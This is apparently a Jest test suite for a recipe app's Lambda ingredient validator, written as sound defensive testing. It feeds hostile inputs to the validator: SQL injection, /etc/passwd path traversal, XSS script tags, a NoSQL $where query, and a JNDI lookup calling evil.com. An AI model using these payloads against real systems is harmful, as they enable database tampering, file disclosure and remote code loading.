import { handler as ingredientValidator } from '../../lambda/ingredient-validator/index';
import { successResponse, errorResponse } from '../../lambda/shared/responses';
import { DynamoDBHelper } from '../../lambda/shared/dynamodb';

// Mock setup
jest.mock('../../lambda/shared/dynamodb');
jest.mock('../../lambda/shared/responses');

describe('Injection Prevention', () => {
  beforeEach(() => {
    jest.clearAllMocks();

    // Restore mocks
    (successResponse as jest.Mock).mockImplementation((data: any, status: number = 200) => ({
      statusCode: status,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    }));

    (errorResponse as jest.Mock).mockImplementation((status: number, error: string, message: string) => ({
      statusCode: status,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ error, message })
    }));
  });

  const maliciousPayloads = [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "../../etc/passwd",
    "${jndi:ldap://evil.com/a}",
    "<script>alert('xss')</script>",
    "UNION SELECT * FROM users",
    "../../../etc/passwd",
    "javascript:alert('xss')"
  ];

  it('should prevent SQL injection in ingredient validation', async () => {
    for (const payload of maliciousPayloads) {
      const event = {
        requestContext: {
          requestId: 'test-request-' + Math.random().toString(36).substr(2, 9)
        },
        body: JSON.stringify({
          ingredients: [payload],
          recipeId: "test-recipe"
        })
      };

      const result = await ingredientValidator(event as any);

      // Should return 200 with validation results, marking malicious input as invalid
      expect(result.statusCode).toBe(200);
      const responseBody = JSON.parse(result.body);
      expect(responseBody.invalid).toContain(payload);
      expect(responseBody.valid).not.toContain(payload);
    }
  });

  it('should prevent NoSQL injection in DynamoDB operations', async () => {
    const maliciousQuery = {
      $where: "this.username == 'admin' && this.password.length > 0"
    };

    const event = {
      requestContext: {
        requestId: 'test-request-nosql'
      },
      body: JSON.stringify({
        ingredients: [JSON.stringify(maliciousQuery)],
        recipeId: "test-recipe"
      })
    };

    const result = await ingredientValidator(event as any);
    expect(result.statusCode).toBe(200);
    const responseBody = JSON.parse(result.body);
    expect(responseBody.invalid).toContain(JSON.stringify(maliciousQuery));
  });

  it('should sanitize input data before processing', async () => {
    const maliciousInput = {
      ingredients: ["<script>alert('xss')</script>", "'; DROP TABLE users; --"],
      recipeId: "test-recipe"
    };

    const event = {
      requestContext: {
        requestId: 'test-request-sanitize'
      },
      body: JSON.stringify(maliciousInput)
    };

    const result = await ingredientValidator(event as any);

    // Should return 200 with validation results, marking malicious inputs as invalid
    expect(result.statusCode).toBe(200);
    const responseBody = JSON.parse(result.body);
    expect(responseBody.invalid).toContain("<script>alert('xss')</script>");
    expect(responseBody.invalid).toContain("'; DROP TABLE users; --");
    expect(responseBody.valid).toHaveLength(0);
  });
});